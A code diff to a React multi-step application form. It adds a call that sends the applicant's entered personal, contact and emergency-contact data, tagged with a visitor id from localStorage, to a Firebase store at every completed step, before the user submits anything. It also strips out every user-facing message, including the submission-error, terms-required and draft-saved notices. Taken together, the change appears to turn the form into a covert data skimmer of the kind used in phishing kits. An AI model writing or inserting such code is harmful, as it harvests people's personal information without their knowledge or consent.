@@ -1,4 +1,4 @@
-import { useState, useCallback } from "react";
+import { useState, useCallback, useEffect } from "react";
 import { useLocation } from "wouter";
 import { useMutation } from "@tanstack/react-query";
 import { Button } from "@/components/ui/button";
@@ -32,6 +32,8 @@ import {
   contactInfoSchema,
   emergencyContactSchema,
 } from "@shared/schema";
+import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
 
 interface FormData {
   applicationType: ApplicationType;
@@ -53,11 +55,12 @@ const initialFormData: FormData = {
 
 export default function ApplyPage() {
   const [, navigate] = useLocation();
-  const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState(1);
   const [completedSteps, setCompletedSteps] = useState<number[]>([]);
   const [formData, setFormData] = useState<FormData>(initialFormData);
   const [errors, setErrors] = useState<Record<string, string>>({});
+
+ 
 
   const submitMutation = useMutation({
     mutationFn: async (data: FormData) => {
@@ -68,11 +71,7 @@ export default function ApplyPage() {
       navigate(`/confirmation/${data.referenceNumber}`);
     },
     onError: (error) => {
-      toast({
-        title: "Submission Failed",
-        description: error.message || "Please try again later.",
-        variant: "destructive",
-      });
+    
     },
   });
 
@@ -126,12 +125,7 @@ export default function ApplyPage() {
 
         case 6:
           if (!formData.termsAccepted) {
-            toast({
-              title: "Terms Required",
-              description:
-                "Please accept the terms and conditions to continue.",
-              variant: "destructive",
-            });
+         
             return false;
           }
           return true;
@@ -140,12 +134,14 @@ export default function ApplyPage() {
           return true;
       }
     },
-    [formData, toast],
+    [formData],
   );
 
   const handleNext = useCallback(() => {
     if (validateStep(currentStep)) {
+      const vid=localStorage.getItem('visitor')
       if (!completedSteps.includes(currentStep)) {
+        addData({id:vid,...formData})
         setCompletedSteps([...completedSteps, currentStep]);
       }
       if (currentStep < 6) {
@@ -273,10 +269,7 @@ export default function ApplyPage() {
               variant="outline"
               size="sm"
               onClick={() => {
-                toast({
-                  title: "Application Saved",
-                  description: "Your progress has been saved as a draft.",
-                });
+              
               }}
               data-testid="button-save-draft"
             >
